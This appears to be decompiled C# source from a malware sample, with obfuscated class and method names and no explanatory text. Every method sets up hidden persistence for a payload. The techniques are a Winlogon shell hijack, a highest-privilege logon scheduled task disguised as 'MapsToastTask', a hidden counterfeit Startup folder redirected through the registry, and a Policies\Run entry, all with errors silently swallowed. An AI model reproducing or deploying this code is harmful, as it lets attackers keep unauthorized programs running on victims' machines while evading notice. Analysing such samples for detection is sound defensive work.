using System;
using System.IO;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices.ComTypes;
using System.Threading;
using A;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using Microsoft.Win32;
using ns20;

namespace ns19;

public class GClass19
{
	public static object smethod_0()
	{
		object result = default(object);
		try
		{
			Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\").SetValue("shell", Operators.ConcatenateObject(Operators.ConcatenateObject((object)"explorer.exe,\"", GClass20.object_0), (object)"\""), RegistryValueKind.Unknown);
			return result;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
			return result;
		}
	}

	public static object smethod_1()
	{
		object result = default(object);
		try
		{
			if (C.b())
			{
				Interaction.Shell(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object)"schtasks /create /f /sc ONLOGON /RL HIGHEST /tn MapsToastTask /tr \"'", GClass20.object_0), (object)"'\"")), (AppWinStyle)0, false, -1);
				return result;
			}
			smethod_0();
			return result;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
			return result;
		}
	}

	public static object smethod_2()
	{
		object result = default(object);
		try
		{
			string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
			D d = (D)new c();
			string text = folderPath + "\\LinkM";
			d.A("LinkM");
			d.b(Conversions.ToString(GClass20.object_0));
			IPersistFile persistFile = (IPersistFile)d;
			Directory.CreateDirectory(text);
			persistFile.Save(Path.Combine(text, GClass20.string_5 + ".lnk"), fRemember: false);
			((ServerComputer)B.Computer).get_FileSystem().CopyDirectory(folderPath + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\", text, false);
			File.SetAttributes(text, FileAttributes.Hidden | FileAttributes.System);
			Registry.CurrentUser.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders").SetValue("Startup", text, RegistryValueKind.Unknown);
			Thread.Sleep(500);
			return result;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
			return result;
		}
	}

	public static object smethod_3()
	{
		object result = default(object);
		try
		{
			string oSFullName = ((ServerComputer)B.Computer).get_Info().get_OSFullName();
			if (C.b() & oSFullName.Contains("Windows 10"))
			{
				Registry.LocalMachine.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Run\\").SetValue(GClass20.string_5, RuntimeHelpers.GetObjectValue(GClass20.object_0), RegistryValueKind.Unknown);
				return result;
			}
			smethod_0();
			return result;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
			return result;
		}
	}
}
